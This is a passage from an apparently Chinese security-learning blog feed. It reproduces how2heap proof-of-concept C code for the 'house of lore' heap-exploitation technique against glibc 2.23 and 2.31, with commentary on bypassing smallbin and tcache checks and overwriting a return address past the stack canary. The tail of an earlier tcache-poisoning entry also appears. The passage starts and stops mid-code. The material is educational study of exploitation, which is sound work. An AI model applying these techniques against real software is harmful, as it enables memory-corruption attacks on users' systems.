class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>    <span class="hljs-type">intptr_t</span> *e = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x28</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);<br><br>    <span class="hljs-comment">// sanity check</span><br>    <span class="hljs-built_in">assert</span>(e == stack_var);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Got control on target/stack!\n\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>2.23只需要用到两个堆块，a堆块用来伪造b堆块的prev_size以及将prev_inuse位清零，而2.31版需要用到三个堆块，假设b堆块有off-by-null溢出，a和c的作用是释放c的时候对a进行unlink从而将fake_chunk,b和c合并成一个大堆块，从而对b进行overlap，使得在b释放的时候也能修改b堆块内的值。在a处伪造fake_chunk是因为这样可以很容易填写自己想要的数据，a[2]和a[3]填入a是为了满足unlink的检查，b的作用是当b被释放进tcache中时，修改b的fd指向stack_var从而伪造tcache链，这样在下下次malloc的时候就能够在stack_var的位置处申请一个堆块。<br><img src="https://i.imgur.com/oY9wSlo.png"></p><p>我们可以看到，在free(b)后tcache的情况如图所示，因为pad是在b之前释放的，因此此时b的fd指向pad，因为我们对b进行了overlap，因此<code> d[0x30 / 8] = (long) stack_var</code>这条语句修改了b的fd的值。<br><img src="https://i.imgur.com/LeoR1SP.png"></p><p>修改之后的情况如图所示，此时b的fd指针指向stack_var，因为tcache是后进先出的，因此下一次malloc（0x28）的时候返回的地址是b，再一次malloc（0x28）的时候返回的地址就是stack_var<br><img src="https://i.imgur.com/WLM08Y1.png"></p>]]></content>
    
    
    <categories>
      
      <category>how2heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>house of lore</title>
    <link href="/2022/07/06/house-of-lore/"/>
    <url>/2022/07/06/house-of-lore/</url>
    
    <content type="html"><![CDATA[<h1 id="House-of-lore"><a href="#House-of-lore" class="headerlink" title="House of lore"></a>House of lore</h1><p>本篇也是跟着<a href="https://github.com/shellphish/how2heap">how2heap</a>来学习的，代码可以去上面下载编译。</p><h2 id="2-23"><a href="#2-23" class="headerlink" title="2.23"></a>2.23</h2><p>首先先看一下2.23版本的，house of lore其实就是伪造一个smallbins链，伪造的smallbins是在栈上的，因此malloc的时候会malloc栈上的空间，此时就可以覆盖返回地址。</p><figure class="highlight cpp"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></div></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span><br><span class="hljs-comment">This PoC take care also of the glibc hardening of smallbin corruption.</span><br><span class="hljs-comment">[ ... ]</span><br><span class="hljs-comment">else</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">      bck = victim-&gt;bk;</span><br><span class="hljs-comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="hljs-comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="hljs-comment">                  goto errout;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">       set_inuse_bit_at_offset (victim, nb);</span><br><span class="hljs-comment">       bin-&gt;bk = bck;</span><br><span class="hljs-comment">       bck-&gt;fd = bin;</span><br><span class="hljs-comment">       [ ... ]</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">jackpot</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span></span>&#123;<br><br><br>  <span class="hljs-type">intptr_t</span>* stack_buffer_1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">intptr_t</span>* stack_buffer_2[<span class="hljs-number">3</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nWelcome to the House of Lore\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This is tested against Ubuntu 16.04.6 - 64bit - glibc-2.23\n\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating the victim chunk\n&quot;</span>);<br>  <span class="hljs-type">intptr_t</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);<br><br>  <span class="hljs-comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span><br>  <span class="hljs-type">intptr_t</span> *victim_chunk = victim<span class="hljs-number">-2</span>;<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="hljs-type">void</span>*)stack_buffer_1);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="hljs-type">void</span>*)stack_buffer_2);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Create a fake chunk on the stack\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span><br>         <span class="hljs-string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);<br>  stack_buffer_1[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">2</span>] = victim_chunk;<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span><br>         <span class="hljs-string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span><br>         <span class="hljs-string">&quot;chunk on stack&quot;</span>);<br>  stack_buffer_1[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_2;<br>  stack_buffer_2[<span class="hljs-number">2</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_1;<br>  <br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span><br>         <span class="hljs-string">&quot;the small one during the free()\n&quot;</span>);<br>  <span class="hljs-type">void</span> *p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);<br><br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);<br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span>*)victim);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);<br><br>  <span class="hljs-type">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1200</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);<br><br>  victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer_1; <span class="hljs-comment">// victim-&gt;bk is pointing to stack</span><br><br>  <span class="hljs-comment">//------------------------------------</span><br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now allocating a chunk with size equal to the first one freed\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n&quot;</span>);<br><br>  <span class="hljs-type">void</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n&quot;</span>);<br>  <span class="hljs-type">char</span> *p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;p4 = malloc(0x100)\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n&quot;</span>,<br>         stack_buffer_2[<span class="hljs-number">2</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\np4 is %p and should be on the stack!\n&quot;</span>, p4); <span class="hljs-comment">// this chunk will be allocated on stack</span><br>  <span class="hljs-type">intptr_t</span> sc = (<span class="hljs-type">intptr_t</span>)jackpot; <span class="hljs-comment">// Emulating our in-memory shellcode</span><br>  <span class="hljs-type">long</span> offset = (<span class="hljs-type">long</span>)__builtin_frame_address(<span class="hljs-number">0</span>) - (<span class="hljs-type">long</span>)p4;<br>  <span class="hljs-built_in">memcpy</span>((p4+offset+<span class="hljs-number">8</span>), &amp;sc, <span class="hljs-number">8</span>); <span class="hljs-comment">// This bypasses stack-smash detection since it jumps over the canary</span><br><br>  <span class="hljs-comment">// sanity check</span><br>  <span class="hljs-built_in">assert</span>((<span class="hljs-type">long</span>)__builtin_return_address(<span class="hljs-number">0</span>) == (<span class="hljs-type">long</span>)jackpot);<br>&#125;<br></code></pre></td></tr></table></figure><p>首先是构造堆栈布局，<code>free(victim)</code>之前的堆栈布局如图所示<br><img src="https://i.imgur.com/JQTAhBH.png"><br>然后<code>free(victim)</code>并且malloc一个比较大的块后，victim会被放到smallbin中，如图所示。<br><img src="https://i.imgur.com/ZAyB1yN.png"><br>此时的堆栈布局如图所示<br><img src="https://i.imgur.com/TCrBKGI.png"><br><code>victim[1] = (intptr_t)stack_buffer_1;</code>后，堆栈布局如图所示<br><img src="https://i.imgur.com/taGNV38.png"></p><p>malloc中对于smallbin链表的检查是这样的</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xl">      [...]<br><br>      <span class="hljs-keyword">else</span><br>        &#123;<br>          <span class="hljs-function"><span class="hljs-title">bck</span> = victim-&gt;</span>bk;<br><span class="hljs-function"><span class="hljs-title">if</span> (__glibc_unlikely (bck-&gt;</span>fd != victim))<br>            &#123;<br>              errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>              goto errout;<br>            &#125;<br>          set_inuse_bit_at_offset (victim, nb);<br>          <span class="hljs-function"><span class="hljs-title">bin</span>-&gt;</span>bk = bck;<br>          <span class="hljs-function"><span class="hljs-title">bck</span>-&gt;</span>fd = bin;<br><br>          [...]<br></code></pre></td></tr></table></figure><p>也就是说将victim从bins中取出来的时候，会检查buffer_1的fd是否指向victim，在取出buffer_1的时候，会检查buffer_2的fd是否指向buffer_1，这也就是为什么要伪造两个buffer。</p><p>因此，p4就相当于在buffer_1处申请了一个堆块，此时就能在栈上覆盖返回地址。</p><h2 id="2-31"><a href="#2-31" class="headerlink" title="2.31"></a>2.31</h2><p>2.31和2.23不同的是tcachebin的存在</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Advanced exploitation of the House of Lore - Malloc Maleficarum.</span><br><span class="hljs-comment">This PoC take care also of the glibc hardening of smallbin corruption.</span><br><span class="hljs-comment">[ ... ]</span><br><span class="hljs-comment">else</span><br><span class="hljs-comment">    &#123;</span><br><span class="hljs-comment">      bck = victim-&gt;bk;</span><br><span class="hljs-comment">    if (__glibc_unlikely (bck-&gt;fd != victim))&#123;</span><br><span class="hljs-comment">                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;</span><br><span class="hljs-comment">                  goto errout;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">       set_inuse_bit_at_offset (victim, nb);</span><br><span class="hljs-comment">       bin-&gt;bk = bck;</span><br><span class="hljs-comment">       bck-&gt;fd = bin;</span><br><span class="hljs-comment">       [ ... ]</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">jackpot</span><span class="hljs-params">()</span></span>&#123; <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Nice jump d00d\n&quot;</span>); <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>); &#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> * argv[])</span></span>&#123;<br><br><br>  <span class="hljs-type">intptr_t</span>* stack_buffer_1[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">intptr_t</span>* stack_buffer_2[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>  <span class="hljs-type">void</span>* fake_freelist[<span class="hljs-number">7</span>][<span class="hljs-number">4</span>];<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nWelcome to the House of Lore\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This is a revisited version that bypass also the hardening check introduced by glibc malloc\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This is tested against Ubuntu 20.04.2 - 64bit - glibc-2.31\n\n&quot;</span>);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating the victim chunk\n&quot;</span>);<br>  <span class="hljs-type">intptr_t</span> *victim = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocated the first small chunk on the heap at %p\n&quot;</span>, victim);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating dummy chunks for using up tcache later\n&quot;</span>);<br>  <span class="hljs-type">void</span> *dummies[<span class="hljs-number">7</span>];<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) dummies[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<br><br>  <span class="hljs-comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span><br>  <span class="hljs-type">intptr_t</span> *victim_chunk = victim<span class="hljs-number">-2</span>;<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;stack_buffer_1 at %p\n&quot;</span>, (<span class="hljs-type">void</span>*)stack_buffer_1);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;stack_buffer_2 at %p\n&quot;</span>, (<span class="hljs-type">void</span>*)stack_buffer_2);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Create a fake free-list on the stack\n&quot;</span>);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++) &#123;<br>    fake_freelist[i][<span class="hljs-number">3</span>] = fake_freelist[i+<span class="hljs-number">1</span>];<br>  &#125;<br>  fake_freelist[<span class="hljs-number">6</span>][<span class="hljs-number">3</span>] = <span class="hljs-literal">NULL</span>;<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;fake free-list at %p\n&quot;</span>, fake_freelist);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Create a fake chunk on the stack\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted&quot;</span><br>         <span class="hljs-string">&quot;in second to the last malloc, which putting stack address on smallbin list\n&quot;</span>);<br>  stack_buffer_1[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>  stack_buffer_1[<span class="hljs-number">2</span>] = victim_chunk;<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 &quot;</span><br>         <span class="hljs-string">&quot;in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake &quot;</span><br>         <span class="hljs-string">&quot;chunk on stack&quot;</span>);<br>  stack_buffer_1[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_2;<br>  stack_buffer_2[<span class="hljs-number">2</span>] = (<span class="hljs-type">intptr_t</span>*)stack_buffer_1;<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash &quot;</span><br>          <span class="hljs-string">&quot;introduced by smallbin-to-tcache mechanism\n&quot;</span>);<br>  stack_buffer_2[<span class="hljs-number">3</span>] = (<span class="hljs-type">intptr_t</span> *)fake_freelist[<span class="hljs-number">0</span>];<br>  <br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocating another large chunk in order to avoid consolidating the top chunk with&quot;</span><br>         <span class="hljs-string">&quot;the small one during the free()\n&quot;</span>);<br>  <span class="hljs-type">void</span> *p5 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1000</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Allocated the large chunk on the heap at %p\n&quot;</span>, p5);<br><br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing dummy chunk\n&quot;</span>);<br>  <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">7</span>; i++) <span class="hljs-built_in">free</span>(dummies[i]);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Freeing the chunk %p, it will be inserted in the unsorted bin\n&quot;</span>, victim);<br>  <span class="hljs-built_in">free</span>((<span class="hljs-type">void</span>*)victim);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;\nIn the unsorted bin the victim&#x27;s fwd and bk pointers are the unsorted bin&#x27;s header address (libc addresses)\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now performing a malloc that can&#x27;t be handled by the UnsortedBin, nor the small bin\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;This means that the chunk %p will be inserted in front of the SmallBin\n&quot;</span>, victim);<br><br>  <span class="hljs-type">void</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1200</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The chunk that can&#x27;t be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n&quot;</span>, p2);<br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;The victim chunk has been sorted and its fwd and bk pointers updated\n&quot;</span>);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;fwd: %p\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">0</span>]);<br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;victim-&gt;bk: %p\n\n&quot;</span>, (<span class="hljs-type">void</span> *)victim[<span class="hljs-number">1</span>]);<br><br>  <span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>  <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n&quot;</span>);<br><br>  victim[<span class="hljs-number">1</span>] = (<span class="hljs-type">intptr_t</span>)stack_buffer_1; <span class="hljs-comment">// victim-&gt;bk is pointing 